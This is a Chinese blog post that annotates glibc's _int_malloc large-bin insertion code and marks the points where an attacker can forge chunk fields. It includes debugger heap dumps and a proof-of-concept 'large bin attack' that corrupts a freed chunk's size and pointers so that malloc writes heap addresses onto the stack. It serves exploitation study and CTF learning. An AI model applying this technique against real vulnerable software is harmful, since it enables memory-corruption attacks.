---
layout: post
title: 解读Glibc中的Large Bin插入过程
date: 2018-04-10 13:32:20 +0300
description: 
img: i-rest.jpg # Add image post (optional)
tags: [pwn]
---
研究下ptmalloc中的_int_malloc代码部分，看看unsorted bin中空闲块是怎样插入到largebin的。



##1.背景

以下代码先将unsorted bin中的块移走然后继续处理。

```C
/*
         Process recently freed or remaindered chunks, taking one only if
         it is exact fit, or, if this a small request, the chunk is remainder from
         the most recent non-exact fit.  Place other traversed chunks in
         bins.  Note that this step is the only place in any routine where
         chunks are placed in bins.
     
         The outer loop here is needed because we might not realize until
         near the end of malloc that we should have consolidated, so must
         do so and retry. This happens at most once, and only when we would
         otherwise need to expand memory to service a "small" request.
       */
     
    #if USE_TCACHE
      INTERNAL_SIZE_T tcache_nb = 0;  
      size_t tc_idx = csize2tidx (nb);                                //nb:申请的size大小
      if (tcache && tc_idx < mp_.tcache_bins)
        tcache_nb = nb;
      int return_cached = 0;
     
      tcache_unsorted_count = 0;
    #endif
     
      for (;; )
        {
          int iters = 0;
          while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))   //若unsorted中存在块。victim:unsorted bin中最后1个块（bk）
            {
              bck = victim->bk;                                                 //bck:保留bk指针，前一个块，unsorted bin是利用BK来遍历的，所以伪造点1——unsorted chunk的bk指向目标地址
              if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
                  || __builtin_expect (chunksize_nomask (victim)
                                       > av->system_mem, 0))
                malloc_printerr ("malloc(): memory corruption");
              size = chunksize (victim);                                        //size:unsorted bin首块的大小
     
              /*
                 If a small request, try to use last remainder if it is the 若unsorted中只有1个块，且申请的是small bin大小，尽量只用它
                 only chunk in unsorted bin.  This helps promote locality for
                 runs of consecutive small requests. This is the only
                 exception to best-fit, and applies only when there is
                 no exact fit for a small chunk.
               */
     
              if (in_smallbin_range (nb) &&           //1.申请大小是small bin大小
                  bck == unsorted_chunks (av) &&      //若只有1个块
                  victim == av->last_remainder &&     //首块是last remainder
                  (unsigned long) (size) > (unsigned long) (nb + MINSIZE))//满足所申请的大小
                {
                  /* split and reattach remainder */  //分割last remainder，一部分返回给用户，剩余的放回unsorted bin
                  remainder_size = size - nb;
                  remainder = chunk_at_offset (victim, nb);
                  unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
                  av->last_remainder = remainder;
                  remainder->bk = remainder->fd = unsorted_chunks (av);
                  if (!in_smallbin_range (remainder_size))
                    {
                      remainder->fd_nextsize = NULL;
                      remainder->bk_nextsize = NULL;
                    }
     
                  set_head (victim, nb | PREV_INUSE |
                            (av != &main_arena ? NON_MAIN_ARENA : 0));
                  set_head (remainder, remainder_size | PREV_INUSE);
                  set_foot (remainder, remainder_size);
     
                  check_malloced_chunk (av, victim, nb);
                  void *p = chunk2mem (victim);
                  alloc_perturb (p, bytes);
                  return p;
                }
     
              /* remove from unsorted list */   //若unsorted bin中含多个chunk,先把它从unsorted中取出来。house of orange用的是这个
              unsorted_chunks (av)->bk = bck;   //伪造点1——目标块被插入到unsorted bin，这样下次遍历就去判断伪造块了
              bck->fd = unsorted_chunks (av);   //伪造点1——目标块的fd指向unsorted bin
     
              /* Take now instead of binning if exact fit */
     
              if (size == nb)                   //2.若恰好找到相等的块，直接返回
                {
                  set_inuse_bit_at_offset (victim, size);
                  if (av != &main_arena)
                    set_non_main_arena (victim);
    #if USE_TCACHE
                  /* Fill cache first, return to user only if cache fills.
                     We may return one of these chunks later.  */
                  if (tcache_nb                 //所以说即便找到刚好合适的块，也要先存着，处理完unsorted bin所有块之后再返回。
                      && tcache->counts[tc_idx] < mp_.tcache_count)
                    {
                      tcache_put (victim, tc_idx);
                      return_cached = 1;
                      continue;
                    }
                  else
                    {
    #endif
                  check_malloced_chunk (av, victim, nb);
                  void *p = chunk2mem (victim);
                  alloc_perturb (p, bytes);
                  return p;
    #if USE_TCACHE
                    }
    #endif
                }
     
              /* place chunk in bin */
     
              if (in_smallbin_range (size))         //若该移除块属于small bin,
                {
                  victim_index = smallbin_index (size);
                  bck = bin_at (av, victim_index);  //bck:small bin的对应下标的地址
                  fwd = bck->fd;
                }
              else                                  //若该移除块属于large bin,
                {
                  victim_index = largebin_index (size);
                  bck = bin_at (av, victim_index);  //bck:large bin的对应下标的地址
                  fwd = bck->fd;    //fwd——最大块
     
                  /* maintain large bins in sorted order */
                  if (fwd != bck)   //若该large bin中有多个块，现在开始按顺序插入
                    {
                      /* Or with inuse bit to speed comparisons */
                      size |= PREV_INUSE;
                      /* if smaller than smallest, bypass loop below */
                      assert (chunk_main_arena (bck->bk));
                      if ((unsigned long) (size)
                          < (unsigned long) chunksize_nomask (bck->bk)) //若移除块小于large bin中最小的块，则直接插入到最后面
                        {
                          fwd = bck;
                          bck = bck->bk;
     
                          victim->fd_nextsize = fwd->fd;              //fd_nextsize指向最大块
                          victim->bk_nextsize = fwd->fd->bk_nextsize; //bk_nextsize指向最小块
                          fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                        }
                      else          //若移除块大于等于large bin中最小的块
                        {
                          assert (chunk_main_arena (fwd));
                          while ((unsigned long) size < chunksize_nomask (fwd))//从最大块开始往下遍历（根据fd_nextsize），直到找到个小于等于移除块的large chunk-fwd
                            {
                              fwd = fwd->fd_nextsize;   //fwd——移除块将插入到fwd前面
                              assert (chunk_main_arena (fwd));
                            }
     
                          if ((unsigned long) size
                              == (unsigned long) chunksize_nomask (fwd))//若刚好等于，则直接插入到它后面
                            /* Always insert in the second position.  */
                            fwd = fwd->fd;
                          else                                          //若移除块比它大，则插入到它前面
                            {
                              victim->fd_nextsize = fwd;
                              victim->bk_nextsize = fwd->bk_nextsize;
                              fwd->bk_nextsize = victim;                //伪造点3——large chunk的bk_nextsize指针，伪造点3——指向移除块，利用这里构造目标地址的size
                              victim->bk_nextsize->fd_nextsize = victim;
                            }
                          bck = fwd->bk;  //fwd-小于等于移除块的large chunk; bck-fwd之前的一个块，这也是个伪造点3——large chunk的BK指针
                        }
                    }
                  else
                    victim->fd_nextsize = victim->bk_nextsize = victim;
                }
     
              mark_bin (av, victim_index);
              victim->bk = bck;         //设置好FD/BK
              victim->fd = fwd;
              fwd->bk = victim;
              bck->fd = victim;         //伪造点2——fd处指向unsorted 移除块，可以使得目标块的BK改为这个移除块，这样下次遍历就到这个移除块了
                                        //伪造点2可能没必要，只要指向一个可访问地址即可
    #if USE_TCACHE
          /* If we've processed as many chunks as we're allowed while
             filling the cache, return one of the cached ones.  */
          ++tcache_unsorted_count;
          if (return_cached
              && mp_.tcache_unsorted_limit > 0
              && tcache_unsorted_count > mp_.tcache_unsorted_limit)
            {
              return tcache_get (tc_idx);
            }
    #endif
     
    #define MAX_ITERS       10000
              if (++iters >= MAX_ITERS)
                break;
            }
     
    #if USE_TCACHE
          /* If all the small chunks we found ended up cached, return one now.  */
          if (return_cached)
            {
              return tcache_get (tc_idx);
            }
    #endif
```
整段代码在1个while循环里，每次迭代中，会优先取用unsorted bin中最近一次释放的块，当unsorted bin中没有可用块后才终止循环。注：遍历unsorted bin是从最后1个块开始，通过bk指针往前遍历。

具体步骤如下：

（1）当1unsorted bin中只有这一个块；2申请的大小属于small bin的范围；3该块满足(大于)申请的大小；4该块是the last remainder。把该块切割，一部分返回给应用层，另一部分再次插入到unsorted bin。

（2）否则，把该块从unsorted bin移除。移除代码可利用

2-1.若移除块的size=申请的size，先放入cache，遍历完毕再返回该块。

2-2.若移除块属于small bin，则插入small bin。

2-3.若移除块属于large bin，则：

2-3-1.若当前large bin为空，就把该移除块插入到当前的large bin，并设置fd_nextsize和bk_nextsize。

2-3-2.否则若当前large bin存在块，则：

2-3-2-1.若large bin（从大到小排列）的最后一个块（最小的块）的size大于移除块，就插入到最后。

2-3-2-2-1.否则，从large bin的第1个块开始遍历，该遍历基于fd_nextsize（而非FD/BK），直到找到一个size小于等于移除块size的块—fwd。若fwd的size等于移除块，则直接插入到fwd后面；

2-3-2-2-2.若小于，则把移除块插入到fwd之前，fd_nextsize=fwd，bk_nextsize=fwd前一个块。


总结：若unsorted bin中只有1个块，并且恰好适合，则直接取用；若unsorted bin中有多个块，在unsorted bin中找块时，先把unsorted bin中的块全放进small bin/large bin，再根据最小最适合的原则在small bin/large bin中寻找，remainder chunk将被放进unsorted bin。large bin中，从大到小排列，同一大小的首块的fd_nextsize（指向后一个小块），bk_nextsize（指向前一个大块）才有意义。

可以看到，除了（1）和（2-1），其他步骤都不会返回。若在unsorted bin中没有找到合适的chunk，将遍历small bin和large bin，找到最小的适合的块，分割该块并把剩余块插入到unsorted bin。还是没找到，则切割top chunk。

##2.large bin管理

根据实例来看看：

```C
    //gcc large.c -o large -no-pie
    #include<stdlib.h>
     
    int main()
    {
        unsigned long *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10;
        unsigned long *p;
        p1 = malloc(0x3f0);
        p2 = malloc(0x20);
        p3 = malloc(0x400);
        p4 = malloc(0x20);
        p5 = malloc(0x400);
        p6 = malloc(0x20);
        p7 = malloc(0x120);
        p8 = malloc(0x20);
        p9 = malloc(0x140);
        p10 = malloc(0x20);
        free(p7);
        free(p9);
     
        p = malloc(0x60);
        p = malloc(0xb0);
     
        free(p1);
        free(p3);
        free(p5);
     
        p = malloc(0x110);
     
        return 0;
    }
```

在free(p9)之后，我们插入2个块到unsorted bin：

```C
    //main_arena status
    unsortedbin
    all: 0x602e10 —▸ 0x602cb0 ◂— 0x7ffff7dd1b78
    smallbins
    empty
    largebins
    empty
    //p7
    pwndbg> x /6xg 0x602cb0
    0x602cb0:   0x0000000000000000  0x0000000000000131
    0x602cc0:   0x00007ffff7dd1b78  0x0000000000602e10
    0x602cd0:   0x0000000000000000  0x0000000000000000
    //p9
    pwndbg> x /6xg 0x602e10
    0x602e10:   0x0000000000000000  0x0000000000000151
    0x602e20:   0x0000000000602cb0  0x00007ffff7dd1b78
    0x602e30:   0x0000000000000000  0x0000000000000000
```
在21行p=malloc(0x60)之后，0x602cb0和0x602e10处的块将被插入到相应的small bin。根据最适合策略，0x130的块从small bin取出，剩余块再次被插入到unsorted bin。

```C
    unsortedbin
    all: 0x602d20 ◂— 0x7ffff7dd1b78
    smallbins
    0x150: 0x602e10 ◂— 0x7ffff7dd1cb8
    //remainder chunk
    pwndbg> x /6xg 0x602d20
    0x602d20:   0x0000000000000000  0x00000000000000c1
    0x602d30:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
    0x602d40:   0x0000000000000000  0x0000000000000000
    pwndbg> x /6xg 0x602e10
    0x602e10:   0x0000000000000000  0x0000000000000151
    0x602e20:   0x00007ffff7dd1cb8  0x00007ffff7dd1cb8
```
在22行p=malloc(0xb0)过后，0x602d20这个块直接从unsorted bin取出并返回，这样只剩0x602e10这个small bin中的块。

在26行free(p5)之后，3个large块被放进unsorted bin。

```C
    //main_arena
    unsortedbin
    all: 0x602870 —▸ 0x602430 —▸ 0x602000 ◂— 0x7ffff7dd1b78
    smallbins
    0x150: 0x602e10 ◂— 0x7ffff7dd1cb8
    //p5
    pwndbg> x /4xg 0x602870
    0x602870:   0x0000000000000000  0x0000000000000411
    0x602880:   0x0000000000602430  0x00007ffff7dd1b78
    //p3
    pwndbg> x /4xg 0x602430
    0x602430:   0x0000000000000000  0x0000000000000411
    0x602440:   0x0000000000602000  0x0000000000602870
    //p1
    pwndbg> x /4xg 0x602000
    0x602000:   0x0000000000000000  0x0000000000000401
    0x602010:   0x00007ffff7dd1b78  0x0000000000602430
```
28行p=malloc(0x110)之后，0x602000（0x400）, 0x602430（0x410） 和 0x602870（0x410） 先被插入到1个large bin，分配器将先在small bin中寻找到合适的块0x602e10。先把0x602e10从small bin中移除，分割为requested size和remainder chunk。
```C
    //main_arena
    unsortedbin
    all: 0x602f30 ◂— 0x7ffff7dd1b78
    smallbins
    empty
    largebins
    0x400: 0x602430 —▸ 0x602870 —▸ 0x602000 ◂— 0x7ffff7dd1f68
    //p3
    pwndbg> x /4xg 0x602430
    0x602430:   0x0000000000000000  0x0000000000000411
    0x602440:   0x0000000000602870  0x00007ffff7dd1f68
    //p5
    pwndbg> x /4xg 0x602870
    0x602870:   0x0000000000000000  0x0000000000000411
    0x602880:   0x0000000000602000  0x0000000000602430
    //p1
    pwndbg> x /4xg 0x602000
    0x602000:   0x0000000000000000  0x0000000000000401
    0x602010:   0x00007ffff7dd1f68  0x0000000000602870
```
可以看到，large bin中的chunk是递减排列的，但问题是，在从unsorted bin插入到large bin的时候，这里没有安全检查（检查是否是递减排列），这里我们再看看以下代码，来体会下步骤（2-3-2-1，2-3-2-2-1，2-3-2-2-2）。
```C
    //gcc largeShow.c -o largeShow -no-pie
    #include<stdlib.h>
     
    int main()
    {
        unsigned long *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10, *p11, *p12;
        unsigned long *p;
        p1 = malloc(0x3f0);
        p2 = malloc(0x20);
        p3 = malloc(0x400);
        p4 = malloc(0x20);
        p5 = malloc(0x400);
        p6 = malloc(0x20);
        p7 = malloc(0x120);
        p8 = malloc(0x20);
        p9 = malloc(0x140);
        p10 = malloc(0x20);
        p11 = malloc(0x400);
        p12 = malloc(0x20);
        free(p7);
        free(p9);
     
        p = malloc(0x60);
        p = malloc(0xb0);
     
        free(p1);
        free(p3);
        free(p5);
     
        p = malloc(0x60);
     
        free(p11);
     
        //step 2-3-2-1
        //*(p1-1) = 0x421;
        //p = malloc(0x60);
         
        //step 2-3-2-2-1
        //p = malloc(0x60);
         
        //step 2-3-2-2-2
        //*(p3-1) = 0x3f1;
        //p = malloc(0x60);
     
        return 0;
    }
```
###2-3-2-1

代码中，我们把large bin中最小块p1的size篡改为0x421，这样large bin中就不是递减排列的了（0x421>0x410）。把p11放进去的时候，直接插入到了尾部。
```C
    //free(p11);
    unsortedbin
    all: 0x602f90 —▸ 0x602e80 ◂— 0x7ffff7dd1b78
    smallbins
    empty
    largebins
    0x400: 0x602430 —▸ 0x602870 —▸ 0x602000 ◂— 0x7ffff7dd1f68
    //*(p1-1) = 0x421;
    //p = malloc(0x60);
    unsortedbin
    all: 0x602ef0 ◂— 0x7ffff7dd1b78
    smallbins
    empty
    largebins
    0x400: 0x602430 —▸ 0x602870 —▸ 0x602000 —▸ 0x602f90 ◂— ...
    pwndbg> x /6xg 0x602430
    0x602430:   0x0000000000000000  0x0000000000000411
    0x602440:   0x0000000000602870  0x00007ffff7dd1f68
    0x602450:   0x0000000000602000  0x0000000000602f90
    pwndbg> x /6xg 0x602870
    0x602870:   0x0000000000000000  0x0000000000000411
    0x602880:   0x0000000000602000  0x0000000000602430
    0x602890:   0x0000000000000000  0x0000000000000000
    pwndbg> x /6xg 0x602000
    0x602000:   0x0000000000000000  0x0000000000000421
    0x602010:   0x0000000000602f90  0x0000000000602870
    0x602020:   0x0000000000602f90  0x0000000000602430
    //移除块被插入到large bin的最后
    pwndbg> x /6xg 0x602f90
    0x602f90:   0x0000000000000000  0x0000000000000411
    0x602fa0:   0x00007ffff7dd1f68  0x0000000000602000
    0x602fb0:   0x0000000000602430  0x0000000000602000
```
###2-3-2-2-1

这里没有篡改，移除块的大小是0x411，比last chunk(p5)大，和第1个块相等(p1)，所以p11被插入到第1个块后面。
```C
    //free(p11);
    unsortedbin
    all: 0x602f90 —▸ 0x602e80 ◂— 0x7ffff7dd1b78
    smallbins
    empty
    largebins
    0x400: 0x602430 —▸ 0x602870 —▸ 0x602000 ◂— 0x7ffff7dd1f68
    //p = malloc(0x60);
    unsortedbin
    all: 0x602ef0 ◂— 0x7ffff7dd1b78
    smallbins
    empty
    largebins
    0x400: 0x602430 —▸ 0x602f90 —▸ 0x602870 —▸ 0x602000 ◂— ...
    pwndbg> x /6xg 0x602430
    0x602430:   0x0000000000000000  0x0000000000000411
    0x602440:   0x0000000000602f90  0x00007ffff7dd1f68
    0x602450:   0x0000000000602000  0x0000000000602000
    //移除块被插入到large bin第1个块后面
    pwndbg> x /6xg 0x602f90
    0x602f90:   0x0000000000000000  0x0000000000000411
    0x602fa0:   0x0000000000602870  0x0000000000602430
    0x602fb0:   0x0000000000000000  0x0000000000000000
    pwndbg> x /6xg 0x602870
    0x602870:   0x0000000000000000  0x0000000000000411
    0x602880:   0x0000000000602000  0x0000000000602f90
    0x602890:   0x0000000000000000  0x0000000000000000
    pwndbg> x /6xg 0x602000
    0x602000:   0x0000000000000000  0x0000000000000401
    0x602010:   0x00007ffff7dd1f68  0x0000000000602870
    0x602020:   0x0000000000602430  0x0000000000602430
```
###2-3-2-2-2

代码中，我们把large bin中最小块p3的size篡改为0x3f1，这样large bin中就不是递减排列的了p3 < p1（0x3f1<0x401）。把p11放进去的时候，直接插入到了首部。p11的fd_nextsize和bk_nextsize也设置好。
```C
    //free(p11);
    unsortedbin
    all: 0x602f90 —▸ 0x602e80 ◂— 0x7ffff7dd1b78
    smallbins
    empty
    largebins
    0x400: 0x602430 —▸ 0x602870 —▸ 0x602000 ◂— 0x7ffff7dd1f68
    //step 2-3-2-2-2
    //*(p3-1) = 0x3f1;
    unsortedbin
    all: 0x602ef0 ◂— 0x7ffff7dd1b78
    smallbins
    empty
    largebins
    0x400: 0x602f90 —▸ 0x602430 —▸ 0x602870 —▸ 0x602000 ◂— ...
    //移除块被插入到large bin的第一个块
    pwndbg> x /6xg 0x602f90
    0x602f90:   0x0000000000000000  0x0000000000000411
    0x602fa0:   0x0000000000602430  0x00007ffff7dd1f68
    0x602fb0:   0x0000000000602430  0x0000000000602000
    pwndbg> x /6xg 0x602430
    0x602430:   0x0000000000000000  0x00000000000003f1
    0x602440:   0x0000000000602870  0x0000000000602f90
    0x602450:   0x0000000000602000  0x0000000000602f90
    pwndbg> x /6xg 0x602870
    0x602870:   0x0000000000000000  0x0000000000000411
    0x602880:   0x0000000000602000  0x0000000000602430
    0x602890:   0x0000000000000000  0x0000000000000000
    pwndbg> x /6xg 0x602000
    0x602000:   0x0000000000000000  0x0000000000000401
    0x602010:   0x00007ffff7dd1f68  0x0000000000602870
    0x602020:   0x0000000000602f90  0x0000000000602430
```
##3.Large bin利用

主要是利用步骤2-3-2-2的代码：
```C
    else
    {
         victim->fd_nextsize = fwd;
         victim->bk_nextsize = fwd->bk_nextsize;
         fwd->bk_nextsize = victim;
         victim->bk_nextsize->fd_nextsize = victim;
    }
    bck = fwd->bk;
    //别忘了 bk,fd也要修改
        mark_bin (av, victim_index);
        victim->bk = bck;
        victim->fd = fwd;
        fwd->bk = victim;
        bck->fd = victim;
```
和unsorted bin attack一样，如果在fwd->bk处构造伪地址fake_chunk，就能修改fake_chunk->fd的值。当然，还要考虑到fd_nextsize和bk_nextsize的值。

以下代码作为示例：
```C
    #include<stdio.h>
    #include<stdlib.h>
     
    int main()
    {
        unsigned long *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10, *p11, *p12;
        unsigned long *p;
        unsigned long stack[8] = {0};
        printf("stack address: %p\n", &stack);
        p1 = malloc(0x3f0);
        p2 = malloc(0x20);
        p3 = malloc(0x400);
        p4 = malloc(0x20);
        p5 = malloc(0x400);
        p6 = malloc(0x20);
        p7 = malloc(0x120);
        p8 = malloc(0x20);
        p9 = malloc(0x140);
        p10 = malloc(0x20);
        p11 = malloc(0x400);
        p12 = malloc(0x20);
        free(p7);
        free(p9);
     
        p = malloc(0x60);
        p = malloc(0xb0);
     
        free(p1);
        free(p3);
        free(p5);
     
        p = malloc(0x60);
     
        free(p11);
     
        *(p3-1) = 0x3f1;
        *(p3) = (unsigned long)(&stack);
        *(p3+1) = (unsigned long)(&stack);
        *(p3+2) = (unsigned long)(&stack);
        *(p3+3) = (unsigned long)(&stack);
        // trigger malicious malloc
        p = malloc(0x60);
     
        return 0;
    }
```
假设这里存在内存溢出漏洞，能够覆盖large bin中第1个块的size为0x3f1，能把fd,bk,fd_nextsize,bk_nextsize设置为栈地址。
```C
    //free(p11);
    unsortedbin
    all: 0x6033a0 —▸ 0x603290 ◂— 0x7ffff7dd1b78
    smallbins
    empty
    largebins
    0x400: 0x602840 —▸ 0x602c80 —▸ 0x602410 ◂— 0x7ffff7dd1f68
    pwndbg> x /6xg 0x602840         //p3
    0x602840:   0x0000000000000000  0x0000000000000411
    0x602850:   0x0000000000602c80  0x00007ffff7dd1f68
    0x602860:   0x0000000000602410  0x0000000000602410
    pwndbg> x /6xg 0x602c80         //p5
    0x602c80:   0x0000000000000000  0x0000000000000411
    0x602c90:   0x0000000000602410  0x0000000000602840
    0x602ca0:   0x0000000000000000  0x0000000000000000
    pwndbg> x /6xg 0x602410         //p1
    0x602410:   0x0000000000000000  0x0000000000000401
    0x602420:   0x00007ffff7dd1f68  0x0000000000602c80
    0x602430:   0x0000000000602840  0x0000000000602840
    //p3伪造过后
    pwndbg> x /6xg 0x602840
    0x602840:   0x0000000000000000  0x00000000000003f1
    0x602850:   0x00007fffffffdc80  0x00007fffffffdc80
    0x602860:   0x00007fffffffdc80  0x00007fffffffdc80
    //p = malloc(0x60);  触发过后
    unsortedbin
    all: 0x603300 ◂— 0x7ffff7dd1b78
    smallbins
    empty
    largebins
    0x400: 0x602840 —▸ 0x7fffffffdc80 —▸ 0x6033a0 —▸ 0x602840 ◂— ...
    pwndbg> x /6xg 0x602840         //p3
    0x602840:   0x0000000000000000  0x00000000000003f1
    0x602850:   0x00007fffffffdc80  0x00000000006033a0
    0x602860:   0x00007fffffffdc80  0x00000000006033a0
    pwndbg> x /6xg 0x7fffffffdc80   //栈上
    0x7fffffffdc80: 0x0000000000000000  0x0000000000000000
    0x7fffffffdc90: 0x00000000006033a0  0x0000000000000000
    0x7fffffffdca0: 0x00000000006033a0  0x0000000000000000
    pwndbg> x /6xg 0x6033a0         //p11
    0x6033a0:   0x0000000000000000  0x0000000000000411
    0x6033b0:   0x0000000000602840  0x00007fffffffdc80
    0x6033c0:   0x0000000000602840  0x00007fffffffdc80
    pwndbg> x /6xg 0x602840         //p3
    0x602840:   0x0000000000000000  0x00000000000003f1
    0x602850:   0x00007fffffffdc80  0x00000000006033a0
    0x602860:   0x00007fffffffdc80  0x00000000006033a0
```


##参考：

https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/

https://dangokyo.me/2018/04/07/0ctf-2018-pwn-heapstorm2-write-up/